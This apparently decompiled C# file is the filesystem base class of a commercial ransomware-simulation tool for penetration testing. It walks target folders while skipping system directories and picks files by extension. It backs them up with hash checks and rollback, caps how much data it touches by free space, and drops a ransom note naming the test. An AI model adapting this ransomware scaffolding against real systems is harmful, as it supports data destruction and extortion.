using System;
using System.Collections.Generic;
using System.IO;
using PenterWare.Utils;

namespace PenterWare.Filesystem.FilesystemTarget;

internal abstract class BaseFilesystem
{
	public const double MinimalFreeStorage = 500.0;

	private const double MinimumFreeStorage = 10.0;

	private const string RansomNoteName = "RansomNote.PNT-RNSM";

	public string EncryptedPathSuffix = ".PNT-RNSM";

	public string BackupPathSuffix = ".PNT-BCKP";

	private const string RansomNoteText = "Please note that the files in this directory were encrypted by PenTera’s Targeted Testing - Ransomware";

	private static List<string> ExcludedFolders = new List<string> { "windows", "games", "programdata", "local settings", "appdata", "program files" };

	public Dictionary<string, string> EnumeratedFilePathsToBackups { get; private set; }

	public List<string> TargetPaths { get; set; }

	public double MaxEnumSizeMB { get; set; }

	public double CurrentEnumSize { get; set; }

	public BaseFilesystem(List<string> targetPaths, double MaxEnumSizeMB)
	{
		TargetPaths = targetPaths;
		EnumeratedFilePathsToBackups = new Dictionary<string, string>();
		CurrentEnumSize = 0.0;
		DecideEnumSize(MaxEnumSizeMB);
	}

	public void DecideEnumSize(double wantedEnumSize)
	{
		double freeSpaceMB = FileUtils.GetFreeSpaceMB(TargetPaths[0]);
		if (freeSpaceMB < 500.0)
		{
			if (freeSpaceMB < 10.0)
			{
				MaxEnumSizeMB = 0.0;
			}
			else
			{
				MaxEnumSizeMB = freeSpaceMB / 20.0;
			}
		}
		else if (wantedEnumSize < freeSpaceMB / 2.0)
		{
			MaxEnumSizeMB = wantedEnumSize;
		}
		else
		{
			MaxEnumSizeMB = freeSpaceMB / 2.0;
		}
	}

	protected void BackupAndEnumerateFilePath(string filePath)
	{
		FileInfo fileInfo = new FileInfo(filePath);
		string text = string.Empty;
		string text2 = string.Empty;
		double num = GeneralUtils.ConvertBytesToMegabytes(fileInfo.Length);
		if (!ShouldFileBeEncrypted(filePath) || !(CurrentEnumSize + num <= MaxEnumSizeMB))
		{
			return;
		}
		try
		{
			KeyValuePair<string, string> keyValuePair = BackupFileToEnumerate(filePath);
			text = keyValuePair.Key;
			text2 = keyValuePair.Value;
		}
		catch (Exception ex)
		{
			GeneralUtils.Log("Error backup " + filePath + ". msg " + ex.Message);
		}
		finally
		{
			if (VerifyValidBackupCreated(text, text2))
			{
				GeneralUtils.Log("Enumerated " + text + ". backup in " + text2);
				EnumeratedFilePathsToBackups[text] = text2;
				CurrentEnumSize += num;
			}
			else if (File.Exists(text) && File.Exists(text2))
			{
				GeneralUtils.Log("Rolling back " + text + " to " + text2);
				Rollback(text, text2);
			}
		}
	}

	public abstract void Rollback(string enumeratedFilePath, string backupFilePath);

	public bool CompareFileHashes(string filepath1, string filepath2)
	{
		try
		{
			string x = CryptoUtils.SHA256File(filepath1);
			string y = CryptoUtils.SHA256File(filepath2);
			return StringComparer.OrdinalIgnoreCase.Compare(x, y) == 0;
		}
		catch (Exception ex)
		{
			GeneralUtils.Log("couldn't compare " + filepath1 + "-" + filepath2 + " contents: " + ex.Message);
			return false;
		}
	}

	protected bool VerifyValidBackupCreated(string filepath1, string filepath2)
	{
		bool result = false;
		try
		{
			result = filepath1 != string.Empty && filepath2 != string.Empty && File.Exists(filepath1) && File.Exists(filepath2) && CompareFileHashes(filepath1, filepath2);
			return result;
		}
		catch (Exception arg)
		{
			GeneralUtils.Log($"Could not verify if backup was created: {arg}");
			return result;
		}
	}

	protected abstract KeyValuePair<string, string> BackupFileToEnumerate(string filePath);

	public bool ShouldFileBeEncrypted(string filePath)
	{
		return Policy.IsFileExtensionInPolicy(filePath);
	}

	public List<string> GetEnumeratedFilePaths()
	{
		return new List<string>(EnumeratedFilePathsToBackups.Keys);
	}

	public void EnumerateFilesystemFiles()
	{
		GeneralUtils.Log($"Target paths for enumeration: {TargetPaths}");
		foreach (string targetPath in TargetPaths)
		{
			if (Directory.Exists(targetPath))
			{
				EnumerateFolder(targetPath);
			}
			else if (File.Exists(targetPath))
			{
				BackupAndEnumerateFilePath(targetPath);
			}
		}
	}

	protected virtual void EnumerateFolder(string folderPath)
	{
		if (!ExcludedFolders.Contains(Path.GetFileName(folderPath)!.ToLower()))
		{
			string[] topFiles = FileUtils.GetTopFiles(folderPath);
			foreach (string filePath in topFiles)
			{
				BackupAndEnumerateFilePath(filePath);
			}
			topFiles = FileUtils.GetTopFolders(folderPath);
			foreach (string folderPath2 in topFiles)
			{
				EnumerateFolder(folderPath2);
			}
		}
	}

	public string WriteRansomNote(string filePath)
	{
		string text = Path.Combine(Path.GetDirectoryName(filePath), "RansomNote.PNT-RNSM");
		if (!File.Exists(text))
		{
			using (StreamWriter streamWriter = new StreamWriter(text, append: true))
			{
				streamWriter.WriteLine("Please note that the files in this directory were encrypted by PenTera’s Targeted Testing - Ransomware");
				return text;
			}
		}
		return null;
	}
}
